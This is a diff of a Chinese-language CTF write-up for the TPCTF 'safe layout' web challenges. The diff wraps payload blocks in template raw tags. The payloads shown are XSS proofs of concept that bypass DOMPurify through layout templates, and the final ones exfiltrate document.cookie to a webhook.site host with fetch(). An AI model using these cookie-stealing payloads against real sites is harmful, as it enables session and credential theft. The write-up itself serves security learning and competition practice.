@@ -34,13 +34,13 @@ DOMPurify 默认允许的 tag 和 attr
 * [DOMPurify/src/tags.ts at 3.2.4 · cure53/DOMPurify](https://github.com/cure53/DOMPurify/blob/3.2.4/src/tags.ts)
 
 Poc
-
+{% raw %}
 ```json
 {"layout":"<img src={{content}}>"}
 
 {"content":"\" onerror=alert(1)>\"","layoutId":3}
 ```
-
+{% endraw %}
 最终 poc
 
 ```JSON
@@ -59,30 +59,33 @@ Poc
 3. CSS 注入？Flag 在 cookie 中而不是页面
 4. CSRF？没有 CSP 防护，form 标签可以进行 CSRF，但 CSRF 应该也无法访问 cookie
 
+{% raw %}
 ```json
 {"layout":"x<style><{{content}}/style><{{content}}img src=x onerror=alert()></style>"}
 
 {"content":"","layoutId":5}
 ```
-
+{% endraw %}
 最终poc
 
+{% raw %}
 ```go
 {"layout":"x<style><{{content}}/style><{{content}}img src=x onerror=fetch('https://webhook.site/f57e3466-a8a4-4a5c-968a-551c1543af38?flag='+document.cookie)></style>"}
 
 {"content":"","layoutId":5}
 ```
-
+{% endraw %}
 ## safe layout revenge
 
 Poc
-
+{% raw %}
 ```go
 {"layout":"x<style><{{content}}/style><{{content}}img src=x onerror=fetch('
 https://webhook.site/c59b785d-cfd5-4936-bcad-e0da7994c7b4?flag='+document.cookie)></style>"}
 
 {"content":"","layoutId":5}
 ```
+{% endraw %}
 
 ```go
 TPCTF{AlS0_r3M3M83r_t0_d1SA8l3_daTa_AND_aR1A}
